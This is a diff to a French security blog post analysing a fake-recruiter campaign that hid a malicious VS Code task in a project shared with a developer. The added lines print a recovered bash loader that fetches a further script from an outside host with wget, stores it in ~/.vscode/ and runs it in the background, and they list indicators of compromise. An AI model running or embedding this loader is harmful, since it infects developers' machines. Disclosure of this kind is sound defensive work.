@@ -15,7 +15,7 @@ type: "post"
 Début septembre 2026, Jean-Jacques reçoit une sollicitation sur LinkedIn. Son
 auteur se présente sous le nom de « Charlie Cook, GMS » et évoque un projet en
 quête de compétences. Les détails restent flous : quelques mots-clés mal agencés
-— intelligence artificielle, *blockchain*, NFT, économie de jetons décentralisée.
+— intelligence artificielle, *blockchain*, économie de jetons décentralisée.
 Plusieurs d'entre eux désignent des choses que nous construisons avec sérieux, et
 Jean-Jacques est curieux : quel produit, pour quel marché, avec quelle
 stratégie ? Il accepte un rendez-vous en visioconférence.
@@ -100,6 +100,29 @@ le confie au shell :
 Les espaces repoussent la commande hors de l'écran, sur GitHub comme dans un
 éditeur. Les réglages d'affichage (`"reveal": "silent"`, `"echo": false`,
 `"close": true`) font le reste : aucun terminal n'apparaît.
+
+Le script que sert cette adresse, tel que récupéré le 10 septembre 2026 sans
+être exécuté, tient en quelques lignes :
+
+```bash
+#!/bin/bash
+set -e
+echo "Authenticated"
+TARGET_DIR="$HOME/.vscode"
+mkdir -p "$TARGET_DIR"
+clear
+wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://earniverse-mvp.vercel.app/api/settings/bootstraplinux"
+clear
+chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
+clear
+nohup bash "$TARGET_DIR/vscode-bootstrap.sh"
+clear
+exit 0
+```
+
+Il affiche « Authenticated », dépose un second script dans `~/.vscode/` — un
+répertoire que possède déjà tout utilisateur de VS Code —, le lance en tâche de
+fond, et efface le terminal après chaque étape.
 
 VS Code ne lance ces tâches qu'avec l'accord de l'utilisateur : dossier approuvé,
 tâches automatiques autorisées. Il faut donc que la victime clique — et c'est à
@@ -237,6 +260,10 @@ déclarent les commits ; elles peuvent avoir été usurpées.
   `vscode-settings-529`, `vscode-settings-0511`
 - plus anciens, en `…/api/validate?token=…` : `0g-auth-check`, `oracle-v3-nu`,
   `oracle-reg-check`
+- script Linux de `earniverse-mvp` servi le 10 septembre 2026 : SHA-256
+  `7cb1a0affb37850270bcf9135c56dd9e0d40f567765f100e38990c0021edc143`
+- troisième étage : `https://earniverse-mvp.vercel.app/api/settings/bootstraplinux`,
+  déposé sous `~/.vscode/vscode-bootstrap.sh` et lancé par `nohup`
 
 **Serveurs de commande** — `http://<adresse>:1224/api/checkStatus`
 
